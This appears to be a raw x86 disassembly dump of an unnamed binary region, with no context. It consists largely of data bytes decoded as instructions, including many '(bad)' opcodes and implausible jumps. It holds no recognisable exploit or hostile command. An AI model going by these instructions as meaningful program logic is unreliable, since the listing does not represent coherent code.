  446f57:	mov    cl,0x54
  446f59:	or     cl,ch
  446f5b:	mov    cl,0x28
  446f5d:	or     cl,ch
  446f5f:	mov    cl,0x4c
  446f61:	or     cl,bh
  446f63:	mov    cl,0x20
  446f65:	or     BYTE PTR [eax],al
  446f67:	add    BYTE PTR [eax],al
  446f69:	add    BYTE PTR [eax],al
  446f6b:	stc    
  446f6c:	mov    cl,0x24
  446f6e:	or     cl,ch
  446f70:	mov    cl,0x38
  446f72:	or     cl,ch
  446f74:	mov    cl,0x1c
  446f76:	or     BYTE PTR [ecx-0x46f7cf4f],bh
  446f7c:	mov    cl,0x34
  446f7e:	or     BYTE PTR [ecx-0x56f7f74f],ch
  446f84:	mov    cl,0x2c
  446f86:	or     BYTE PTR [ecx-0x46f7ff4f],bh
  446f8c:	mov    cl,0x4
  446f8e:	or     BYTE PTR [ecx-0x56f7e74f],ch
  446f94:	mov    cl,0xfc
  446f96:	pop    es
  446f97:	jns    0x446f4a
  446f99:	xor    DWORD PTR [edi],eax
  446f9b:	jns    0x446f4e
  446f9d:	xor    eax,0xe8b16907
  446fa2:	pop    es
  446fa3:	imul   esi,DWORD PTR [ecx-0x4e86f7f4],0xb17907e0
  446fad:	in     al,0x7
  446faf:	imul   esi,DWORD PTR [ecx-0x4e96f808],0xb13907dc
  446fb9:	lock pop es
  446fbb:	cmp    DWORD PTR [ecx-0x4ed6f80c],esi
  446fc1:	enter  0x2907,0xb1
  446fc5:	in     al,dx
  446fc6:	pop    es
  446fc7:	cmp    DWORD PTR [ecx+0x1b9007c0],esi
  446fcd:	or     eax,0xda
  446fd2:	add    BYTE PTR [eax],al
  446fd4:	xchg   edi,eax
  446fd5:	sbb    ecx,DWORD PTR ds:0xd1b8fce
  446fdb:	rcl    BYTE PTR [edi-0x7039f2e5],cl
  446fe1:	sbb    ecx,DWORD PTR ds:0xd1b97ca
  446fe7:	mov    esi,0xc20d1b8f
  446fec:	xchg   edi,eax
  446fed:	sbb    ecx,DWORD PTR ds:0xd1b8fb6
  446ff3:	mov    edx,0xae0d1b97
  446ff8:	(bad)  
  446ff9:	sbb    ecx,DWORD PTR ds:0xd1b97b2
  446fff:	imul   ecx,DWORD PTR [ebp-0x6aa0f2e5],0x1b
  447006:	or     eax,0xd1b8d63
  44700b:	push   edi
  44700c:	xchg   ebp,eax
  44700d:	sbb    ecx,DWORD PTR ds:0xd1b8d5b
  447013:	dec    edi
  447014:	xchg   ebp,eax
  447015:	sbb    ecx,DWORD PTR ds:0xd1b8d53
  44701b:	sbb    al,0x95
  44701d:	sbb    DWORD PTR ds:0xd198f86,ecx
  447023:	mov    dl,BYTE PTR [edi-0x7081f2e7]
  447029:	sbb    DWORD PTR ds:0xd199782,ecx
  44702f:	cmp    ecx,DWORD PTR [ebp-0x6ad0f2e7]
  447035:	sbb    DWORD PTR ds:0x33,ecx
  44703b:	add    BYTE PTR [eax],al
  44703d:	lea    ebx,[ecx]
  44703f:	or     eax,0xd199527
  447044:	data16 (bad) 
  447046:	sbb    DWORD PTR ds:0xd19976a,ecx
  44704c:	pop    esi
  44704d:	(bad)  
  44704e:	mov    dl,0xf7
  447050:	add    esi,DWORD PTR [edx-0x41fc0855]
  447056:	stos   DWORD PTR es:[edi],eax
  447057:	test   DWORD PTR [ebx],0x3f7abba
  44705d:	(bad)  
  44705e:	stos   DWORD PTR es:[edi],eax
  44705f:	test   DWORD PTR [ebx],0x3f7ab62
  447065:	fwait
  447066:	lods   eax,DWORD PTR ds:[esi]
  447067:	test   DWORD PTR [ebx],0x3f7aeff
  44706d:	xchg   ebx,eax
  44706e:	lods   eax,DWORD PTR ds:[esi]
  44706f:	test   DWORD PTR [ebx],0x3f7ab52
  447075:	sahf   
  447076:	stos   DWORD PTR es:[edi],eax
  447077:	test   DWORD PTR [ebx],0x3f7ab9a
  44707d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44707e:	stos   DWORD PTR es:[edi],eax
  44707f:	test   DWORD PTR [ebx],0x3f7ab82
  447085:	outs   dx,BYTE PTR ds:[esi]
  447086:	stos   DWORD PTR es:[edi],eax
  447087:	test   DWORD PTR [ebx],0x3f7ab6a
  44708d:	xchg   esi,eax
  44708e:	stos   DWORD PTR es:[edi],eax
  44708f:	test   DWORD PTR [ebx],0x3f7ab72
  447095:	jle    0x447042
  447097:	test   DWORD PTR [ebx],0x3f7ab7a
  44709d:	xchg   BYTE PTR [ebx+0x3f7],ch
  4470a3:	add    BYTE PTR [eax],al
  4470a5:	add    BYTE PTR [edx-0x71fc0855],ah
  4470ab:	stos   DWORD PTR es:[edi],eax
  4470ac:	test   DWORD PTR [ebx],0x3f7ab8a
  4470b2:	jbe    0x447060
  4470b4:	test   DWORD PTR [ebx],0x3f7ab92
  4470ba:	pop    esi
  4470bb:	lods   al,BYTE PTR ds:[esi]
  4470bc:	test   DWORD PTR [ebx],0x3f7ac5a
  4470c2:	data16 lods al,BYTE PTR ds:[esi]
  4470c4:	test   DWORD PTR [ebx],0x3f7ac42
  4470ca:	lods   al,BYTE PTR cs:[esi]
  4470cc:	push   cs
  4470cd:	jmp    0xe9548965
  4470d2:	xchg   ebx,eax
  4470d3:	in     al,0xf
  4470d5:	jmp    0xe954816d
  4470da:	xchg   ebx,eax
  4470db:	fmul   QWORD PTR [edi]
  4470dd:	jmp    0xe9545975
  4470e2:	xchg   ebx,eax
  4470e3:	hlt    
  4470e4:	psubsw mm2,QWORD PTR [ebx-0x6c16f020]
  4470eb:	aaa    
  4470ec:	adc    ch,cl
  4470ee:	xchg   ebx,eax
  4470ef:	adc    DWORD PTR [edx],0xffffffe9
  4470f2:	xchg   ebx,eax
  4470f3:	das    
  4470f4:	adc    ch,cl
  4470f6:	xchg   ebx,eax
  4470f7:	lock psubsw mm2,QWORD PTR [ebx-0x6c16efc4]
  4470ff:	dec    eax
  447100:	adc    cl,ch
  447102:	xchg   ebx,eax
  447103:	push   esp
  447104:	adc    cl,ch
  447106:	xchg   ebx,eax
  447107:	inc    eax
  447108:	adc    cl,ch
  44710a:	add    BYTE PTR [eax],al
  44710c:	add    BYTE PTR [eax],al
  44710e:	add    BYTE PTR [ebx-0x6c16efb4],dl
  447114:	pop    eax
  447115:	adc    cl,ch
  447117:	xchg   ebx,eax
  447118:	and    al,0x10
  44711a:	jmp    0xe954c1b2
  44711f:	xchg   ebx,eax
  447120:	sbb    al,0x10
  447122:	jmp    0xe95499ba
  447127:	xchg   ebx,eax
  447128:	xor    al,0x10
  44712a:	jmp    0xe95495c2
  44712f:	xchg   ebx,eax
  447130:	cmp    BYTE PTR [eax],dl
  447132:	jmp    0xe9549dca
  447137:	xchg   ebx,eax
  447138:	adc    BYTE PTR [eax],0xe9
  44713b:	xchg   ebx,eax
  44713c:	xor    al,0x10
  44713e:	jmp    0xe954f9d6
  447143:	xchg   ebx,eax
  447144:	jl     0x447156
  447146:	jmp    0x5501de
  44714b:	cmp    DWORD PTR [esi-0x49c6f9a4],esi
  447151:	jo     0x447159
  447153:	sub    DWORD PTR [esi-0x49d6f98c],esi
  447159:	dec    eax
  44715a:	push   es
  44715b:	cmp    DWORD PTR [esi-0x49c6f994],esi
  447161:	inc    eax
  447162:	push   es
  447163:	sub    DWORD PTR [esi-0x49d6f9bc],esi
  447169:	pop    eax
  44716a:	push   es
  44716b:	stc    
  44716c:	mov    ch,0x3c
  44716e:	push   es
  44716f:	stc    
  447170:	mov    ch,0x15
  447172:	add    al,0x0
  447174:	add    BYTE PTR [eax],al
  447176:	add    BYTE PTR [eax],al
  447178:	jmp    0xe9485b32
  44717d:	mov    ch,0xd
  44717f:	add    al,0xf9
  447181:	mov    ch,0xe1
  447183:	add    edi,ecx
  447185:	mov    ch,0x20
  447187:	push   es
  447188:	jmp    0xe94a9642
  44718d:	mov    ch,0x38
  44718f:	push   es
  447190:	mov    ecx,0xb9061cb5
  447195:	mov    ch,0x30
  447197:	push   es
  447198:	test   eax,0xa90634b5
  44719d:	mov    ch,0x8
  44719f:	push   es
  4471a0:	mov    ecx,0xb9062cb5
  4471a5:	mov    ch,0x0
  4471a7:	push   es
  4471a8:	test   eax,0xa90604b5
  4471ad:	mov    ch,0x18
  4471af:	push   es
  4471b0:	jns    0x447167
  4471b2:	cld    
  4471b3:	add    eax,0x610b579
  4471b8:	imul   esi,DWORD PTR [ebp-0x4a96f9ec],0xb57905e8
  4471c2:	or     al,0x6
  4471c4:	jns    0x44717b
  4471c6:	loopne 0x4471cd
  4471c8:	nop
  4471c9:	or     ecx,DWORD PTR ds:0xd0b8dfa
  4471cf:	out    dx,al
  4471d0:	xchg   ebp,eax
  4471d1:	or     ecx,DWORD PTR ds:0xd0b8df2
  4471d7:	out    0x95,al
  4471d9:	or     ecx,DWORD PTR ds:0xea
  4471df:	add    BYTE PTR [eax],al
  4471e1:	lea    ecx,[ebx]
  4471e3:	or     eax,0xd0b95de
  4471e8:	loop   0x447177
  4471ea:	or     ecx,DWORD PTR ds:0xd0b95d6
  4471f0:	fimul  DWORD PTR [ebp-0x6a31f2f5]
  4471f6:	or     ecx,DWORD PTR ds:0xd0b8dd2
  4471fc:	(bad)  
  4471fd:	xchg   ebp,eax
  4471fe:	or     ecx,DWORD PTR ds:0xd0b8dca
  447204:	mov    esi,0xc20d0b95
  447209:	lea    ecx,[ebx]
  44720b:	or     eax,0xd0b95b6
  447210:	mov    edx,0xae0d0b8d
  447215:	xchg   ebp,eax
  447216:	or     ecx,DWORD PTR ds:0xd0b8db2
  44721c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44721d:	xchg   ebp,eax
  44721e:	or     ecx,DWORD PTR ds:0xd0b8daa
  447224:	sahf   
  447225:	xchg   ebp,eax
  447226:	or     ecx,DWORD PTR ds:0xd0b8da2
  44722c:	xchg   esi,eax
  44722d:	xchg   ebp,eax
  44722e:	or     ecx,DWORD PTR ds:0xd0b8d9a
  447234:	mov    ss,WORD PTR [ebp-0x726df2f7]
  44723a:	or     DWORD PTR ds:0xd099586,ecx
  447240:	mov    cl,BYTE PTR [ebp+0x7e0d09]
  447246:	add    BYTE PTR [eax],al
  447248:	add    BYTE PTR [eax],al
  44724a:	xchg   ebp,eax
  44724b:	mov    dl,0xf7
  44724d:	add    edx,DWORD PTR [edx]
  44724f:	mov    dh,0xf7
  447251:	add    esp,esi
  447253:	mov    ch,0xf7
  447255:	add    ebx,edx
  447257:	mov    ch,0xf7
  447259:	add    edi,DWORD PTR [esi-0x3dfc084b]
  44725f:	mov    ch,0xf7
  447261:	add    esi,DWORD PTR [esi-0x55fc084b]
  447267:	mov    ch,0xf7
  447269:	add    ecx,esi
  44726b:	mov    ch,0xf7
  44726d:	add    esi,DWORD PTR [edx-0x39fc084b]
  447273:	mov    ch,0xf7
  447275:	add    edi,DWORD PTR [edx+0x5e03f7b5]
  44727b:	mov    ch,0xf7
  44727d:	add    esp,DWORD PTR [edx-0x4b]
  447280:	test   DWORD PTR [ebx],0x3f7b556
  447286:	dec    edx
  447287:	mov    ch,0xf7
  447289:	add    ebp,DWORD PTR [esi+0x5203f7b5]
  44728f:	mov    ch,0xf7
  447291:	add    esp,DWORD PTR [esi-0x65fc084b]
  447297:	mov    ch,0xf7
  447299:	add    edi,DWORD PTR [esi-0x4b]
  44729c:	test   DWORD PTR [ebx],0x3f7b582
  4472a2:	jbe    0x447259
  4472a4:	test   DWORD PTR [ebx],0x3f7b56a
  4472aa:	mov    ?,WORD PTR [ebp+0x3f7]
  4472b0:	add    BYTE PTR [eax],al
  4472b2:	add    BYTE PTR [edx-0x4b],dh
  4472b5:	test   DWORD PTR [ebx],0x3f7b586
  4472bb:	jp     0x447272
  4472bd:	test   DWORD PTR [ebx],0x3f7b59e
  4472c3:	mov    ds:0x9603f7b5,al
  4472c8:	mov    ch,0xe
  4472ca:	jmp    0xe9581f62
  4472cf:	xchg   ebx,eax
  4472d0:	add    BYTE PTR [edx],dl
  4472d2:	jmp    0xe958276a
  4472d7:	xchg   ebx,eax
  4472d8:	or     BYTE PTR [edx],dl
  4472da:	jmp    0xe9566f72
  4472df:	xchg   ebx,eax
  4472e0:	adc    BYTE PTR [edx],dl
  4472e2:	jmp    0xe956777a
  4472e7:	xchg   ebx,eax
  4472e8:	sbb    BYTE PTR [edx],dl
  4472ea:	jmp    0xe9567f82
  4472ef:	xchg   ebx,eax
  4472f0:	loopne 0x447303
  4472f2:	jmp    0xe956878a
  4472f7:	xchg   ebx,eax
  4472f8:	call   0xdcd85c0e
  4472fd:	adc    ecx,ebp
  4472ff:	xchg   ebx,eax
  447300:	lock adc ecx,ebp
  447303:	xchg   ebx,eax
  447304:	in     al,0x11
  447306:	jmp    0xe9566b9e
  44730b:	xchg   ebx,eax
  44730c:	in     al,dx
  44730d:	adc    ecx,ebp
  44730f:	xchg   ebx,eax
  447310:	inc    eax
  447311:	adc    ch,cl
  447313:	xchg   ebx,eax
  447314:	hlt    
  447315:	adc    ecx,ebp
  447317:	add    BYTE PTR [eax],al
  447319:	add    BYTE PTR [eax],al
  44731b:	add    BYTE PTR [ebx-0x6c16edb8],dl
  447321:	cmp    al,0x12
  447323:	jmp    0xe956c3bb
  447328:	xchg   ebx,eax
  447329:	inc    esp
  44732a:	adc    ch,cl
  44732c:	xchg   ebx,eax
  44732d:	pop    eax
  44732e:	adc    ch,cl
  447330:	xchg   ebx,eax
  447331:	dec    esp
  447332:	adc    ch,cl
  447334:	xchg   ebx,eax
  447335:	and    BYTE PTR [edx],dl
  447337:	jmp    0xe956c7cf
  44733c:	xchg   ebx,eax
  44733d:	sub    BYTE PTR [edx],dl
  44733f:	jmp    0xe9568fd7
  447344:	xchg   ebx,eax
  447345:	sub    al,0x12
  447347:	add    BYTE PTR [ecx-0x4e],bh
  44734a:	jl     0x447350
  44734c:	imul   esi,DWORD PTR [edx-0x4d96fb70],0xb2790494
  447356:	push   0x8cb27904
  44735b:	add    al,0x69
  44735d:	mov    dl,0x60
  44735f:	add    al,0x69
  447361:	mov    dl,0x64
  447363:	add    al,0x39
  447365:	mov    dl,0x78
  447367:	add    al,0x39
  447369:	mov    dl,0x5c
  44736b:	add    al,0x29
  44736d:	mov    dl,0x70
  44736f:	add    al,0x29
  447371:	mov    dl,0x74
  447373:	add    al,0x39
  447375:	mov    dl,0x48
  447377:	add    al,0x39
  447379:	mov    dl,0x6c
  44737b:	add    al,0x29
  44737d:	mov    dl,0x40
  44737f:	add    al,0x0
  447381:	add    BYTE PTR [eax],al
  447383:	add    BYTE PTR [eax],al
  447385:	sub    DWORD PTR [edx-0x4e06fbbc],esi
  44738b:	pop    eax
  44738c:	add    al,0xf9
  44738e:	mov    cl,0x3c
  447390:	add    al,0xe9
  447392:	mov    cl,0x50
  447394:	add    al,0xe9
  447396:	mov    cl,0x54
  447398:	add    al,0xf9
  44739a:	mov    cl,0x28
  44739c:	add    al,0xf9
  44739e:	mov    cl,0x4c
  4473a0:	add    al,0xe9
  4473a2:	mov    cl,0x20
  4473a4:	add    al,0xe9
  4473a6:	mov    cl,0x24
  4473a8:	add    al,0xb9
  4473aa:	mov    cl,0x38
  4473ac:	add    al,0xb9
  4473ae:	mov    cl,0x1c
  4473b0:	add    al,0xa9
  4473b2:	mov    cl,0x30
  4473b4:	add    al,0xa9
  4473b6:	mov    cl,0x34
  4473b8:	add    al,0xb9
  4473ba:	mov    cl,0x8
  4473bc:	add    al,0xb9
  4473be:	mov    cl,0x2c
  4473c0:	add    al,0xa9
  4473c2:	mov    cl,0x0
  4473c4:	add    al,0x90
  4473c6:	or     ecx,DWORD PTR ds:0xd0b941a
  4473cc:	push   cs
  4473cd:	mov    WORD PTR [ebx],cs
  4473cf:	or     eax,0xd0b9412
  4473d4:	push   es
  4473d5:	mov    WORD PTR [ebx],cs
  4473d7:	or     eax,0xd0b940a
  4473dc:	(bad)  
  4473dd:	xchg   ebx,eax
  4473de:	or     ecx,DWORD PTR ds:0xd0b9402
  4473e4:	not    BYTE PTR [ebx+0xfa0d0b]
  4473ea:	add    BYTE PTR [eax],al
  4473ec:	add    BYTE PTR [eax],al
  4473ee:	xchg   ebx,eax
  4473ef:	or     ecx,DWORD PTR ds:0xd0b93ee
  4473f5:	repnz xchg ebx,eax
  4473f7:	or     ecx,DWORD PTR ds:0xd0b93e6
  4473fd:	jmp    0xb93:0xde0d0b93
  447404:	or     eax,0xd0b93e2
  447409:	(bad)  
  44740a:	xchg   ebx,eax
  44740b:	or     ecx,DWORD PTR ds:0xd0b93da
  447411:	into   
  447412:	xchg   ebx,eax
  447413:	or     ecx,DWORD PTR ds:0xd0b93d2
  447419:	and    DWORD PTR [ecx-0x6eeaf2f5],edx
  44741f:	or     ecx,DWORD PTR ds:0xd0b9119
  447425:	or     eax,0x120d0b91
  44742a:	xchg   ecx,eax
  44742b:	or     ecx,DWORD PTR ds:0xd0b912e
  447431:	xor    eax,0xfd0d0b91
  447436:	nop
  447437:	or     ecx,DWORD PTR ds:0xd0b9101
  44743d:	cmc    
  44743e:	nop
  44743f:	or     ecx,DWORD PTR ds:0xf7b290f9
  447445:	add    ebp,DWORD PTR [ebp-0x5dfc084f]
  44744b:	mov    cl,0xf7
  44744d:	add    esi,DWORD PTR [ebp-0x4d]
  447450:	test   DWORD PTR [ebx],0x0
  447456:	add    BYTE PTR [ecx-0x4d],bh
  447459:	test   DWORD PTR [ebx],0x3f7b35d
  44745f:	jno    0x447414
  447461:	test   DWORD PTR [ebx],0x3f7b345
  447467:	dec    ecx
  447468:	mov    bl,0xf7
  44746a:	add    ecx,DWORD PTR [ebp-0x4d]
  44746d:	test   DWORD PTR [ebx],0x3f7b342
  447473:	push   ebp
  447474:	mov    bl,0xf7
  447476:	add    ebx,DWORD PTR [ecx-0x4d]
  447479:	test   DWORD PTR [ebx],0x3f7b2fd
  44747f:	push   ecx
  447480:	mov    bl,0xf7
  447482:	add    esp,ebp
  447484:	mov    dl,0xf7
  447486:	add    ebp,ecx
  447488:	mov    dl,0xf7
  44748a:	add    ebp,ebp
  44748c:	mov    dl,0xf7
  44748e:	add    esp,ecx
  447490:	mov    dl,0xf7
  447492:	add    esi,DWORD PTR ds:0x3903f7b3
  447498:	mov    bl,0xf7
  44749a:	add    ebx,DWORD PTR ds:0x5e03f7b3
  4474a0:	sti    
  4474a1:	imul   ebp,esi,0xc5d47616
  4474a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4474a8:	shl    bh,1
  4474aa:	(bad)  
  4474ab:	popf   
  4474ac:	mov    al,0x17
  4474ae:	add    al,0x90
  4474b0:	mov    dl,0xb8
  4474b2:	dec    eax
  4474b3:	into   
  4474b4:	fwait
  4474b5:	test   DWORD PTR [ebx],0xf3522f90
  4474bb:	add    BYTE PTR [eax],al
  4474bd:	add    BYTE PTR [eax],al
  4474bf:	add    BYTE PTR [edi-0x7b],bh
  4474c2:	lock (bad) 
  4474c4:	jne    0x44747a
  4474c6:	push   cs
  4474c7:	sub    DWORD PTR [edx+esi*4-0x30a79df2],edx
  4474ce:	sbb    DWORD PTR [edi-0x75],ebx
  4474d1:	xor    eax,0xb2926f12
  4474d6:	lea    ebp,[ecx+0x6abe0397]
  4474dc:	dec    ebx
  4474dd:	add    esp,DWORD PTR [edx-0x11]
  4474e0:	or     bh,BYTE PTR [ebp-0x2c372dd3]
  4474e6:	dec    eax
  4474e7:	adc    ecx,ebp
  4474e9:	das    
  4474ea:	rol    dh,cl
  4474ec:	lock lock adc eax,0x4bd56e9
  4474f3:	jmp    0x6253278b
  4474f8:	fmul   st,st(7)
  4474fa:	sbb    DWORD PTR [edi+0x2e33b1d3],edx
  447500:	xchg   ebx,eax
  447501:	mov    dl,0xe
  447503:	adc    bl,0xb2
  447506:	push   cs
  447507:	jmp    0x39255630
  44750c:	adc    al,0xbd
  44750e:	adc    al,0x6a
  447510:	(bad)  [eax-0x42ed1a9d]
  447516:	add    al,0xe8
  447518:	adc    bh,dl
  44751a:	or     edx,DWORD PTR [edi+ecx*4-0x681cacd1]
  447521:	sub    DWORD PTR [ebx-0x11],eax
  447524:	add    BYTE PTR [eax],al
  447526:	add    BYTE PTR [eax],al
  447528:	add    ah,cl
  44752a:	adc    DWORD PTR [ebx],edx
  44752c:	call   0xda2d7254
  447531:	xchg   ebx,eax
  447532:	mov    dl,0x9b
  447534:	in     eax,dx
  447535:	add    ebp,DWORD PTR [edi-0x23395f2]
  44753b:	out    0xb9,eax
  44753d:	shl    DWORD PTR [esi],1
  44753f:	push   ebx
  447540:	or     dl,BYTE PTR [ebp-0x57ffb1b4]
  447546:	xor    esi,ebp
  447548:	cmp    al,ch
  44754a:	dec    ebp
  44754b:	or     eax,0xcda47c89
  447550:	ret    
  447551:	cmp    bh,BYTE PTR [ebx+0xf751fe8]
  447557:	mov    WORD PTR [ebp-0x6d],es
  44755a:	scas   eax,DWORD PTR es:[edi]
  44755b:	xchg   ebp,eax
  44755c:	inc    ebp
  44755d:	pop    edx
  44755e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44755f:	mov    eax,0xee337b40
  447564:	pop    es
  447565:	add    BYTE PTR [edx-0x4],dh
  447568:	xor    BYTE PTR [esp+eiz*4-0x15],0x74
  44756d:	jae    0x4475a2
  44756f:	arpl   WORD PTR [edx],cx
  447571:	jns    0x447534
  447573:	jmp    0xeac2:0xea9c2c82
  44757a:	mov    ecx,0xb2651fe8
  44757f:	lea    eax,[ebp+0x43]
  447582:	mov    dl,0xcd
  447584:	adc    DWORD PTR [eax+esi*4-0x2],0x74
  447589:	sub    eax,0x1a2b33
  44758e:	add    BYTE PTR [eax],al
  447590:	add    BYTE PTR [eax],al
  447592:	cmp    esi,ebx
  447594:	cmc    
  447595:	bound  esi,QWORD PTR [esi+0x37]
  447598:	loope  0x447525
  44759a:	in     al,dx
  44759b:	fwait
  44759c:	cmovne ecx,DWORD PTR [edx+0x33]
  4475a0:	sub    esp,DWORD PTR [ebx]
  4475a2:	sti    
  4475a3:	repnz loopne 0x4475eb
  4475a6:	(bad)  
  4475a8:	mov    WORD PTR [ebp-0x36],es
  4475ab:	mov    bl,0xcd
  4475ad:	xor    DWORD PTR [ebx+esi*4-0x2],0x74
  4475b2:	dec    DWORD PTR [ebp-0x3e]
  4475b5:	push   esi
  4475b7:	ss int 0xe8
  4475ba:	lods   eax,DWORD PTR ds:[esi]
  4475bb:	mov    ah,0xe
  4475bd:	add    BYTE PTR [edx],ch
  4475bf:	xor    esp,DWORD PTR [ebx+0x2]
  4475c2:	nop
  4475c3:	sti    
  4475c4:	pop    ds
  4475c5:	or     DWORD PTR [eax-0x400855ab],edi
  4475cb:	lock dec edi
  4475cd:	and    edx,ebx
  4475cf:	jecxz  0x4475ca
  4475d1:	add    DWORD PTR [eax+0x2583ce0b],edx
  4475d7:	cld    
  4475d8:	dec    esp
  4475d9:	ins    DWORD PTR es:[edi],dx
  4475da:	xchg   esi,eax
  4475db:	and    ebp,esi
  4475dd:	add    DWORD PTR [eax-0x2a0831f5],edx
  4475e3:	in     al,dx
  4475e4:	int    0x83
  4475e6:	add    eax,0x9573ed0e
  4475eb:	mov    WORD PTR [eax+0x23],ss
  4475ee:	lea    ecx,[esi+ecx*4+0x3d]
  4475f2:	mov    bl,0xc
  4475f4:	into   
  4475f5:	add    DWORD PTR [eax],0x0
  4475f8:	add    BYTE PTR [eax],al
  4475fa:	add    ch,ah
  4475fc:	or     eax,0x8c956d4d
  447601:	push   eax
  447602:	and    ecx,DWORD PTR [ecx-0x6d8a7134]
  447608:	stos   DWORD PTR es:[edi],eax
  447609:	and    ebp,edi
  44760b:	adc    cl,BYTE PTR [esi-0x12]
  44760e:	cld    
  44760f:	push   edx
  447610:	mov    WORD PTR [eax+0x23],ss
  447613:	xchg   ebx,eax
  447614:	int3   
  447615:	mov    ch,0x80
  447617:	das    
  447618:	shr    BYTE PTR [edx-0x30533209],0x83
  44761f:	popf   
  447620:	fmul   QWORD PTR [ebp+ebp*2+0x72]
  447624:	rcl    BYTE PTR [eax+0x2],1
  447627:	push   eax
  447628:	or     ecx,DWORD PTR ds:0xee4e0700
  44762e:	mov    dl,BYTE PTR [ebp-0x14]
  447631:	sbb    DWORD PTR [esi-0x79ee7978],ebp
  447637:	xchg   ebx,eax
  447638:	or     ecx,DWORD PTR [esi-0x43f77340]
  44763e:	mov    edi,0xe3f5b255
  447643:	xlat   BYTE PTR ds:[ebx]
  447644:	clc    
  447645:	test   dh,0xc7
  447648:	outs   dx,BYTE PTR ds:[esi]
  447649:	adc    al,0xc7
  44764b:	adc    esi,DWORD PTR [edi+0x4]
  44764e:	inc    esp
  44764f:	sub    eax,0x7341d0d5
  447654:	clc    
  447655:	xor    esi,esp
  447657:	das    
  447658:	ja     0x44766f
  44765a:	or     esi,DWORD PTR ds:0x63cfb0
  447660:	add    BYTE PTR [eax],al
  447662:	add    BYTE PTR [eax],al
  447664:	xchg   ecx,eax
  447665:	mov    dl,0xf7
  447667:	(bad)  
  447668:	or     ebp,DWORD PTR [edi-0x2c]
  44766b:	or     bh,BYTE PTR [esi]
  44766d:	stos   DWORD PTR es:[edi],eax
  44766e:	jb     0x447670
  447670:	push   cs
  447671:	mov    ah,0xf7
  447673:	xchg   BYTE PTR [eax-0x51],dl
  447676:	nop
  447677:	aam    0x53
  447679:	xor    al,0x32
  44767b:	out    0x90,eax
  44767d:	repz pop edi
  44767f:	inc    ecx
  447680:	mov    bl,0xf8
  447682:	xor    esi,esp
  447684:	fbstp  TBYTE PTR [ebp+0x15]
  447687:	or     esp,ebp
  447689:	mov    al,0x3f
  44768b:	cmp    edx,DWORD PTR [ecx+0x1bc6f7b2]
  447691:	outs   dx,BYTE PTR ds:[esi]
  447692:	adc    al,0xb
  447694:	out    dx,al
  447695:	stos   BYTE PTR es:[edi],al
  447696:	bound  eax,QWORD PTR [eax]
  447698:	push   cs
  447699:	mov    ah,0xf7
  44769b:	xchg   BYTE PTR [eax-0x51],dl
  44769e:	and    ah,dl
  4476a0:	push   ebx
  4476a1:	xor    al,0xba
  4476a3:	add    eax,0xabdd7670
  4476a8:	and    al,0xf9
  4476aa:	pop    es
  4476ab:	mov    ebx,0xffd46e13
  4476b0:	ror    BYTE PTR [edx],cl
  4476b2:	or     eax,0x73f807ba
  4476b7:	inc    ecx
  4476b8:	mov    bl,0xb4
  4476ba:	xor    al,0x87
  4476bc:	gs ret 
  4476be:	push   cs
  4476bf:	test   eax,0xa1f0f8a0
  4476c4:	xchg   esp,eax
  4476c5:	mov    dl,0xe
  4476c7:	stos   BYTE PTR es:[edi],al
  4476c8:	add    BYTE PTR [eax],al
  4476ca:	add    BYTE PTR [eax],al
  4476cc:	add    BYTE PTR [esi],cl
  4476ce:	mov    dh,0x2d
  4476d0:	jmp    0x4476a8
  4476d2:	xor    edx,DWORD PTR [ebx+0xa]
  4476d5:	nop
  4476d6:	repz mov WORD PTR [edi+esi*4],fs
  4476da:	test   bl,0x6a
  4476dd:	js     0x4476a2
  4476df:	dec    esi
  4476e0:	xor    al,0x92
  4476e2:	or     bh,BYTE PTR [ebx]
  4476e4:	call   0xc212297c
  4476e9:	sbb    al,0x0
  4476eb:	jmp    0x44f4596
  4476f0:	lahf   
  4476f1:	dec    edx
  4476f2:	dec    DWORD PTR [esp+edx*1-0x189c4c6a]
  4476f9:	sub    ecx,DWORD PTR [edx-0x18]
  4476fc:	xchg   BYTE PTR [edx],bh
  4476fe:	repz cmc 
  447700:	fst    DWORD PTR [edx+esi*4-0x4af155f2]
  447707:	sub    eax,0x6b3356ea
  44770c:	out    dx,eax
  44770d:	rol    DWORD PTR [ebp-0x2c2f95ed],cl
  447713:	pop    ss
  447714:	sub    cl,BYTE PTR [esi]
  447716:	mov    ch,0x2d
  447718:	in     al,0x56
  44771a:	xor    ebp,DWORD PTR [ebx-0x11]
  44771d:	mov    ds:0xd06a1385,eax
  447722:	ror    DWORD PTR ds:0x107d0e2a,cl
  447728:	or     DWORD PTR [ecx-0xb],esp
  44772b:	mov    ebp,DWORD PTR [esi+ebp*1+0x6acbf6]
  447732:	add    BYTE PTR [eax],al
  447734:	add    BYTE PTR [eax],al
  447736:	push   eax
  447737:	rcl    DWORD PTR [edi],cl
  447739:	sub    dl,BYTE PTR [ebx]
  44773b:	jge    0x44774b
  44773d:	call   0x1357002
  447742:	pop    es
  447743:	cmp    ecx,esp
  447745:	(bad)  
  447746:	mov    edx,0xf900d04b
  44774b:	mov    dl,0xcd
  44774d:	sub    BYTE PTR [ebx+esi*4+0xf],0x75
  447752:	out    0x4a,eax
  447754:	pop    edx
  447755:	(bad)  
  447756:	out    dx,al
  447757:	cmp    ch,cl
  447759:	sbb    BYTE PTR [ebx+esi*4+0xf],0x75
  44775e:	mov    bh,0x4a
  447760:	push   esi
  447761:	dec    dh
  447763:	cmp    ch,cl
  447765:	sub    DWORD PTR [eax+esi*4-0x2],0x74
  44776a:	mov    bh,0x4a
  44776c:	and    bh,dh
  44776e:	out    dx,al
  44776f:	cmp    ch,cl
  447771:	call   0x5325bb
  447776:	cmp    dh,BYTE PTR [eax]
  447778:	arpl   WORD PTR [ebx],si
  44777a:	mov    ecx,0x1e7e8c5
  44777f:	scas   eax,DWORD PTR es:[edi]
  447780:	push   cs
  447781:	add    BYTE PTR [edx],ch
  447783:	xor    BYTE PTR [ebx+0x2],ah
  447786:	pop    ecx
  447787:	(bad)
  44778a:	mov    ah,0xf
  44778c:	call   0x2dfa6253
  447791:	add    eax,0x7d8cefaa
  447796:	cmp    esp,DWORD PTR [edx+0x107a]
  44779c:	add    BYTE PTR [eax],al
  44779e:	add    cl,dl
  4477a0:	ret    0xffe3
  4477a3:	into   
  4477a4:	daa    
  4477a5:	sub    ebx,DWORD PTR [edx]
